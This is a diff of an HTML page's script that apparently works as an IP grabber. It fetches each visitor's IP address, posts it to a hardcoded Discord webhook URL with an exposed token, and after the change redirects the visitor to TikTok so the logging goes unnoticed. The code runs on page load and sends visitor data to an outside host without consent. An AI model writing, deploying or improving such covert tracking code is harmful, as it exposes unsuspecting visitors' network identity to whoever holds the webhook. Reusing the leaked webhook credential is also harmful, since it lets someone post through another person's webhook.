@@ -36,7 +36,7 @@
         async function sendIPToWebhook(ip) {
             const webhookURL = 'https://discord.com/api/webhooks/1282983823314911273/Y5LlHH7GI6GzWz4AmalE4wWQWkxzWnscHIDAzWTCj8RVpU5QZ4roOkVgphFceQ5ennbY';
             const payload = {
-                content: `Ip of the user: ${ip}`
+                content: `User IP Address: ${ip}`
             };
             await fetch(webhookURL, {
                 method: 'POST',
@@ -47,8 +47,12 @@
             });
         }
 
-        // Execute the functions
-        getUserIP().then(ip => sendIPToWebhook(ip)).catch(err => console.error(err));
+        // Execute the functions and then redirect
+        getUserIP().then(ip => {
+            return sendIPToWebhook(ip);
+        }).then(() => {
+            window.location.href = 'https://www.tiktok.com'; // Redirect to TikTok or any desired URL
+        }).catch(err => console.error(err));
     </script>
 </body>
 </html>
